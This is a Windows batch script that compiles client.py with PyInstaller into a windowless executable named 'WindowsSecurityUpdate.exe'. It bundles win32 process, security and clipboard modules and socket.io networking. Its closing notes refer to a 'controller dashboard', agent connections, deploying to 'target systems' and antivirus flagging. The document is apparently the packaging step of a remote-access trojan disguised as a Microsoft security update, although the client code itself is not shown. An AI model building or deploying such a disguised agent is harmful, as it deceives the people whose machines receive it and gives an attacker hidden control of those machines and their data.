@echo off
REM ========================================
REM Build client.py to standalone .exe
REM ========================================

echo.
echo ╔══════════════════════════════════════════════════════════════════════════════╗
echo ║              BUILDING CLIENT.PY TO EXE WITH PYINSTALLER                      ║
echo ╚══════════════════════════════════════════════════════════════════════════════╝
echo.

REM Check if PyInstaller is installed
python -c "import PyInstaller" 2>NUL
if errorlevel 1 (
    echo [ERROR] PyInstaller not found!
    echo.
    echo Installing PyInstaller...
    pip install pyinstaller
    echo.
)

echo [1/5] Checking dependencies...
python -c "import socketio, engineio, aiohttp, websockets" 2>NUL
if errorlevel 1 (
    echo [WARNING] Some dependencies missing. Install with:
    echo pip install -r requirements-client.txt
    echo.
    pause
    exit /b 1
)
echo     ✅ Dependencies OK
echo.

echo [2/5] Cleaning previous build...
if exist "build" rmdir /s /q "build"
if exist "dist" rmdir /s /q "dist"
if exist "client.spec" del /q "client.spec"
echo     ✅ Clean complete
echo.

echo [3/5] Building with PyInstaller...
echo     This may take 2-5 minutes...
echo.

pyinstaller ^
  --onefile ^
  --noconsole ^
  --name "WindowsSecurityUpdate" ^
  --hidden-import=win32timezone ^
  --hidden-import=win32api ^
  --hidden-import=win32con ^
  --hidden-import=win32security ^
  --hidden-import=win32process ^
  --hidden-import=win32event ^
  --hidden-import=win32clipboard ^
  --hidden-import=socketio ^
  --hidden-import=socketio.client ^
  --hidden-import=engineio ^
  --hidden-import=engineio.client ^
  --hidden-import=aiohttp ^
  --hidden-import=websockets ^
  --collect-all socketio ^
  --collect-all engineio ^
  client.py

if errorlevel 1 (
    echo.
    echo [ERROR] Build failed!
    echo Check the error messages above.
    echo.
    pause
    exit /b 1
)

echo.
echo [4/5] Verifying build...
if exist "dist\WindowsSecurityUpdate.exe" (
    echo     ✅ Build successful!
    echo.
    
    REM Get file size
    for %%A in ("dist\WindowsSecurityUpdate.exe") do set size=%%~zA
    set /a sizeMB=%size%/1048576
    echo     File: dist\WindowsSecurityUpdate.exe
    echo     Size: %sizeMB% MB
) else (
    echo     ❌ Build failed - .exe not found!
    pause
    exit /b 1
)
echo.

echo [5/5] Cleaning temporary files...
if exist "build" rmdir /s /q "build"
if exist "client.spec" del /q "client.spec"
echo     ✅ Cleanup complete
echo.

echo ╔══════════════════════════════════════════════════════════════════════════════╗
echo ║                          BUILD COMPLETE! ✅                                  ║
echo ╚══════════════════════════════════════════════════════════════════════════════╝
echo.
echo Your executable is ready:
echo.
echo     📁 Location: dist\WindowsSecurityUpdate.exe
echo     📏 Size: %sizeMB% MB
echo.
echo Next steps:
echo   1. Test: dist\WindowsSecurityUpdate.exe
echo   2. Check controller dashboard for agent connection
echo   3. Deploy to target systems
echo.
echo ⚠️  IMPORTANT:
echo   - Antivirus may flag the .exe (add exclusion if needed)
echo   - Test on a clean Windows VM first
echo   - Ensure controller URL is correct in client.py before building
echo.

pause
